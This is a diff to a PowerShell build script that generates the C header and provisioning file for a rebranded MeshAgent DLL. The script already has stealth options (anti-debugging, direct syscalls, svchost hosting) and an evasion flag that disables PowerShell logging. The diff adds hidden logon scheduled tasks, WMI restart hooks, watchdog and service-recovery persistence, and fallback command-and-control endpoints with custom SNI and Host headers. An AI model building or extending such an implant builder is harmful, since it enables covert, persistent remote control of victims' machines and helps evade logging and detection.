@@ -70,6 +70,41 @@ function BoolToInt($val) {
     if ($val -eq $true) { return 1 } else { return 0 }
 }
 
+function Convert-ToCLiteral {
+    param([string]$Value)
+
+    if ([string]::IsNullOrWhiteSpace($Value)) {
+        return "NULL"
+    }
+
+    $escaped = $Value -replace '\\', '\\\\' -replace '"', '\"'
+    return '"' + $escaped + '"'
+}
+
+function Convert-MeshIdToHexString {
+    param([string]$MeshId)
+
+    if ([string]::IsNullOrWhiteSpace($MeshId)) { return $MeshId }
+    if ($MeshId.StartsWith('0x')) { return $MeshId.ToUpperInvariant() }
+
+    try {
+        $normalized = $MeshId.Replace('@', '+').Replace('$', '/')
+        $bytes = [Convert]::FromBase64String($normalized)
+        if ($null -eq $bytes -or $bytes.Length -eq 0) { return $MeshId }
+        $hex = ($bytes | ForEach-Object { $_.ToString('X2') }) -join ''
+        return '0x' + $hex
+    } catch {
+        Write-Host "[WARN] Unable to convert MeshID '$MeshId' to hex: $($_.Exception.Message)" -ForegroundColor Yellow
+        return $MeshId
+    }
+}
+
+function Escape-CText {
+    param([string]$Value)
+    if ($null -eq $Value) { return "" }
+    return ($Value -replace '\\', '\\\\' -replace '"', '\"')
+}
+
 # Derived branding artifacts
 $installRoot = if ($config.branding.installRoot) { $config.branding.installRoot } else { "C:/ProgramData/DiagnosticHost" }
 $logPath = if ($config.branding.logPath) { $config.branding.logPath } else { "$installRoot/logs" }
@@ -143,15 +178,108 @@ $stealthAntiDebugFlag = BoolToInt (Get-OptionalBool -Source $config.stealth -Pro
 $stealthSyscallsFlag = BoolToInt (Get-OptionalBool -Source $config.stealth -PropertyName 'syscallsDirectMode')
 $stealthSvchostFlag = BoolToInt $svchostMode
 $stealthBundleFlag = BoolToInt $bundleExtractFlag
+$meshIdRawValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'meshId'
+$meshIdHexValue = Convert-MeshIdToHexString -MeshId $meshIdRawValue
+$meshIdHeaderValue = if (-not [string]::IsNullOrWhiteSpace($meshIdHexValue)) { $meshIdHexValue } else { $meshIdRawValue }
 
+$networkSection = if ($config.network) { $config.network } else { [pscustomobject]@{} }
 $persistence = if ($config.persistence) { $config.persistence } else { [pscustomobject]@{} }
 $scheduledTask = if ($persistence.scheduledTask) { $persistence.scheduledTask } else { [pscustomobject]@{} }
 $wmiSection = if ($persistence.wmi) { $persistence.wmi } else { [pscustomobject]@{} }
 $watchdogSection = if ($persistence.watchdog) { $persistence.watchdog } else { [pscustomobject]@{} }
+$serviceRecovery = if ($persistence.serviceRecovery) { $persistence.serviceRecovery } else { [pscustomobject]@{} }
+$primaryHostHeaderLiteral = Convert-ToCLiteral (Get-OptionalValue -Source $networkSection -PropertyName 'hostHeader')
+$fallbackEntries = @()
+$fallbackSource = Get-OptionalValue -Source $networkSection -PropertyName 'fallbackEndpoints'
+if ($fallbackSource) {
+    foreach ($entry in $fallbackSource) {
+        if ($null -eq $entry) { continue }
+        if ($entry -is [string]) {
+            if ([string]::IsNullOrWhiteSpace($entry)) { continue }
+            $fallbackEntries += [pscustomobject]@{
+                url        = $entry.Trim()
+                sni        = $null
+                hostHeader = $null
+                userAgent  = $null
+                alpn       = @()
+            }
+            continue
+        }
+        $url = Get-OptionalValue -Source $entry -PropertyName 'url'
+        if ([string]::IsNullOrWhiteSpace($url)) { continue }
+        $entryAlpn = @()
+        if ($entry.alpn -is [System.Collections.IEnumerable]) {
+            $entryAlpn = @($entry.alpn | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
+        }
+        $fallbackEntries += [pscustomobject]@{
+            url        = $url
+            sni        = Get-OptionalValue -Source $entry -PropertyName 'sni'
+            hostHeader = Get-OptionalValue -Source $entry -PropertyName 'hostHeader'
+            userAgent  = Get-OptionalValue -Source $entry -PropertyName 'userAgent'
+            alpn       = $entryAlpn
+        }
+    }
+}
+$fallbackCount = $fallbackEntries.Count
+if ($fallbackCount -gt 0) {
+    $fallbackListMacro = "{ " + ($fallbackEntries | ForEach-Object {
+        $alpnValue = $null
+        if ($_.alpn -and $_.alpn.Count -gt 0) { $alpnValue = ($_.alpn -join ";") }
+        "{ " + (Convert-ToCLiteral $_.url) + ", " + (Convert-ToCLiteral $_.sni) + ", " + (Convert-ToCLiteral $_.hostHeader) + ", " + (Convert-ToCLiteral $_.userAgent) + ", " + (Convert-ToCLiteral $alpnValue) + " }"
+    }) -join ", " + " }"
+} else {
+    $fallbackListMacro = "{ }"
+}
 $persistRunKeyFlag = BoolToInt (Get-OptionalBool -Source $persistence -PropertyName 'runKey')
 $persistTaskFlag = BoolToInt (Get-OptionalBool -Source $scheduledTask -PropertyName 'enabled')
 $persistWmiFlag = BoolToInt (Get-OptionalBool -Source $wmiSection -PropertyName 'enabled')
 $persistWatchdogFlag = BoolToInt (Get-OptionalBool -Source $watchdogSection -PropertyName 'enabled')
+$persistRecoveryEnabledFlag = BoolToInt (Get-OptionalBool -Source $serviceRecovery -PropertyName 'enabled')
+
+$brandingServiceName = if ([string]::IsNullOrWhiteSpace($config.branding.serviceName)) { "Mesh Agent" } else { $config.branding.serviceName }
+$persistTaskName = Get-OptionalValue -Source $scheduledTask -PropertyName 'taskName'
+if ([string]::IsNullOrWhiteSpace($persistTaskName)) { $persistTaskName = "$brandingServiceName Autorun" }
+$persistTaskTrigger = Get-OptionalValue -Source $scheduledTask -PropertyName 'trigger'
+if ([string]::IsNullOrWhiteSpace($persistTaskTrigger)) { $persistTaskTrigger = "ONLOGON" }
+$persistTaskHiddenFlag = BoolToInt (Get-OptionalBool -Source $scheduledTask -PropertyName 'hidden' -Default $true)
+
+$persistRestartTaskName = Get-OptionalValue -Source $wmiSection -PropertyName 'taskName'
+if ([string]::IsNullOrWhiteSpace($persistRestartTaskName)) { $persistRestartTaskName = "$brandingServiceName-RestartOnStop" }
+$persistWmiClassValue = Get-OptionalValue -Source $wmiSection -PropertyName 'className'
+$persistWmiMethodValue = Get-OptionalValue -Source $wmiSection -PropertyName 'methodName'
+$persistWmiNamespaceValue = Get-OptionalValue -Source $wmiSection -PropertyName 'namespace'
+if ($null -eq $persistWmiClassValue) { $persistWmiClassValue = "" }
+if ($null -eq $persistWmiMethodValue) { $persistWmiMethodValue = "" }
+if ($null -eq $persistWmiNamespaceValue) { $persistWmiNamespaceValue = "" }
+
+$persistWatchdogInterval = Get-OptionalValue -Source $watchdogSection -PropertyName 'intervalSeconds'
+if ([string]::IsNullOrWhiteSpace($persistWatchdogInterval)) { $persistWatchdogInterval = 0 }
+$persistWatchdogRestartDelay = Get-OptionalValue -Source $watchdogSection -PropertyName 'restartDelay'
+if ([string]::IsNullOrWhiteSpace($persistWatchdogRestartDelay)) { $persistWatchdogRestartDelay = 0 }
+$persistWatchdogRestartFlag = BoolToInt (Get-OptionalBool -Source $watchdogSection -PropertyName 'restartOnCrash')
+$persistRecoveryResetPeriod = Get-OptionalValue -Source $serviceRecovery -PropertyName 'resetPeriod'
+if ([string]::IsNullOrWhiteSpace($persistRecoveryResetPeriod)) { $persistRecoveryResetPeriod = 0 }
+$persistRecoveryRestartDelay = Get-OptionalValue -Source $serviceRecovery -PropertyName 'restartDelay'
+if ([string]::IsNullOrWhiteSpace($persistRecoveryRestartDelay)) { $persistRecoveryRestartDelay = 0 }
+$persistRecoveryActions = @()
+if ($serviceRecovery.actions) {
+    foreach ($action in $serviceRecovery.actions) {
+        if ([string]::IsNullOrWhiteSpace($action)) { continue }
+        $persistRecoveryActions += $action.ToString().Trim()
+    }
+}
+$persistRecoveryActionsString = ($persistRecoveryActions -join ",")
+if (-not [string]::IsNullOrWhiteSpace($persistRecoveryActionsString)) {
+    $persistRecoveryActionsString = $persistRecoveryActionsString.ToLowerInvariant()
+}
+$persistRecoveryActionsEscaped = Escape-CText $persistRecoveryActionsString
+
+$persistTaskNameEscaped = Escape-CText $persistTaskName
+$persistTaskTriggerEscaped = Escape-CText ($persistTaskTrigger.ToUpperInvariant())
+$persistRestartTaskNameEscaped = Escape-CText $persistRestartTaskName
+$persistWmiClassEscaped = Escape-CText $persistWmiClassValue
+$persistWmiMethodEscaped = Escape-CText $persistWmiMethodValue
+$persistWmiNamespaceEscaped = Escape-CText $persistWmiNamespaceValue
 
 $evasion = if ($config.evasion) { $config.evasion } else { [pscustomobject]@{} }
 $evasionPsLoggingFlag = BoolToInt (Get-OptionalBool -Source $evasion -PropertyName 'disablePowerShellLogging')
@@ -267,11 +395,14 @@ $header = @"
 /* ========== Network Configuration ========== */
 #define MESH_AGENT_NETWORK_ENDPOINT "$($config.network.primaryEndpoint)"
 #define MESH_AGENT_NETWORK_SNI NULL
+#define MESH_AGENT_NETWORK_HOST_HEADER $primaryHostHeaderLiteral
 #define MESH_AGENT_NETWORK_USER_AGENT "$($config.network.userAgent)"
 #define MESH_AGENT_NETWORK_JA3 NULL
+#define MESH_AGENT_NETWORK_FALLBACK_COUNT $fallbackCount
+#define MESH_AGENT_NETWORK_FALLBACK_LIST $fallbackListMacro
 
 /* ========== Provisioning Data ========== */
-#define MESH_AGENT_MESH_ID "$($config.provisioning.meshId)"
+#define MESH_AGENT_MESH_ID "$meshIdHeaderValue"
 #define MESH_AGENT_SERVER_ID "$($config.provisioning.serverId)"
 #define MESH_AGENT_MESH_NAME "$($config.provisioning.meshName)"
 #define MESH_AGENT_SERVER_URL "$($config.provisioning.serverUrl)"
@@ -293,6 +424,20 @@ $header = @"
 #define MESH_AGENT_PERSIST_TASK $persistTaskFlag
 #define MESH_AGENT_PERSIST_WMI $persistWmiFlag
 #define MESH_AGENT_PERSIST_WATCHDOG $persistWatchdogFlag
+#define MESH_AGENT_PERSIST_RECOVERY_ENABLED $persistRecoveryEnabledFlag
+#define MESH_AGENT_PERSIST_TASK_NAME TEXT("$persistTaskNameEscaped")
+#define MESH_AGENT_PERSIST_TASK_TRIGGER TEXT("$persistTaskTriggerEscaped")
+#define MESH_AGENT_PERSIST_TASK_HIDDEN $persistTaskHiddenFlag
+#define MESH_AGENT_PERSIST_RESTART_TASK_NAME TEXT("$persistRestartTaskNameEscaped")
+#define MESH_AGENT_PERSIST_WMI_CLASS TEXT("$persistWmiClassEscaped")
+#define MESH_AGENT_PERSIST_WMI_METHOD TEXT("$persistWmiMethodEscaped")
+#define MESH_AGENT_PERSIST_WMI_NAMESPACE TEXT("$persistWmiNamespaceEscaped")
+#define MESH_AGENT_PERSIST_WATCHDOG_INTERVAL $persistWatchdogInterval
+#define MESH_AGENT_PERSIST_WATCHDOG_RESTART_DELAY $persistWatchdogRestartDelay
+#define MESH_AGENT_PERSIST_WATCHDOG_RESTART_ON_CRASH $persistWatchdogRestartFlag
+#define MESH_AGENT_PERSIST_RECOVERY_RESET_PERIOD $persistRecoveryResetPeriod
+#define MESH_AGENT_PERSIST_RECOVERY_RESTART_DELAY_MS $persistRecoveryRestartDelay
+#define MESH_AGENT_PERSIST_RECOVERY_ACTIONS TEXT("$persistRecoveryActionsEscaped")
 
 /* ========== Evasion Features ========== */
 #define MESH_AGENT_DISABLE_PS_LOGGING $evasionPsLoggingFlag
@@ -321,8 +466,7 @@ $meshNameValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'm
 if ($meshNameValue) { $mshLines += "MeshName=$meshNameValue" }
 $meshTypeValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'meshType'
 if ($meshTypeValue) { $mshLines += "MeshType=$meshTypeValue" }
-$meshIdValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'meshId'
-if ($meshIdValue) { $mshLines += "MeshID=$meshIdValue" }
+if ($meshIdHeaderValue) { $mshLines += "MeshID=$meshIdHeaderValue" }
 $serverIdValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'serverId'
 if ($serverIdValue) { $mshLines += "ServerID=$serverIdValue" }
 $serverUrlValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'serverUrl'
@@ -331,28 +475,45 @@ $serviceNameValue = $config.branding.serviceName
 if ($serviceNameValue) { $mshLines += "meshServiceName=$serviceNameValue" }
 $displayNameValue = $config.branding.displayName
 if ($displayNameValue) { $mshLines += "displayName=$displayNameValue" }
-
-$installFlags = Get-OptionalValue -Source $config.provisioning -PropertyName 'installFlags'
-if ($null -ne $installFlags -and $installFlags -ne "") {
-    $mshLines += "InstallFlags=$installFlags"
-}
-$autoRegisterRaw = Get-OptionalValue -Source $config.provisioning -PropertyName 'autoRegister'
-if ($autoRegisterRaw -ne $null) {
-    $autoRegisterValue = if ([bool]$autoRegisterRaw) { "1" } else { "0" }
-    $mshLines += "AutoRegister=$autoRegisterValue"
-}
+$companyNameValue = $config.branding.companyName
+if ($companyNameValue) { $mshLines += "companyName=$companyNameValue" }
+$descriptionValue = $config.branding.description
+if ($descriptionValue) { $mshLines += "description=$descriptionValue" }
+$binaryNameValue = $config.branding.binaryName
+if ($binaryNameValue) { $mshLines += "fileName=$binaryNameValue" }
 
 Set-Content -Path $OutputMsh -Value $mshLines -Encoding UTF8
 Write-Host "[SUCCESS] .msh file generated: $OutputMsh" -ForegroundColor Green
 
 Write-Host ""
 Write-Host "=== Provisioning Embedded ===" -ForegroundColor Green
-if ($meshIdValue) {
-    $meshIdPreview = if ($meshIdValue.Length -gt 20) { $meshIdValue.Substring(0,20) + "..." } else { $meshIdValue }
+if ($meshIdRawValue) {
+    $meshIdPreview = if ($meshIdRawValue.Length -gt 20) { $meshIdRawValue.Substring(0,20) + "..." } else { $meshIdRawValue }
     Write-Host "Mesh ID:   $meshIdPreview" -ForegroundColor Cyan
+}
+if ($meshIdHeaderValue -and $meshIdHeaderValue -ne $meshIdRawValue) {
+    $meshIdHexPreview = if ($meshIdHeaderValue.Length -gt 20) { $meshIdHeaderValue.Substring(0,20) + "..." } else { $meshIdHeaderValue }
+    Write-Host "Mesh ID (hex): $meshIdHexPreview" -ForegroundColor Cyan
 }
 if ($serverIdValue) {
     $serverIdPreview = if ($serverIdValue.Length -gt 20) { $serverIdValue.Substring(0,20) + "..." } else { $serverIdValue }
     Write-Host "Server ID: $serverIdPreview" -ForegroundColor Cyan
 }
+Write-Host "Endpoint:  $($networkSection.primaryEndpoint)" -ForegroundColor Cyan
+if ($fallbackCount -gt 0) {
+    $idx = 1
+    foreach ($entry in $fallbackEntries) {
+        $details = @()
+        if ($entry.sni) { $details += "SNI=$($entry.sni)" }
+        if ($entry.hostHeader) { $details += "Host=$($entry.hostHeader)" }
+        if ($entry.userAgent) { $details += "UA=$($entry.userAgent)" }
+        if ($entry.alpn -and $entry.alpn.Count -gt 0) { $details += "ALPN=$($entry.alpn -join ';')" }
+        $meta = if ($details.Count -gt 0) { " [" + ($details -join ", ") + "]" } else { "" }
+        Write-Host ("  Fallback {0}: {1}{2}" -f $idx, $entry.url, $meta) -ForegroundColor Cyan
+        $idx++
+    }
+} else {
+Write-Host "  Fallbacks: (none)" -ForegroundColor DarkGray
+}
 Write-Host ""
+Write-Host "Ready to build MeshAgent DLL!" -ForegroundColor Green
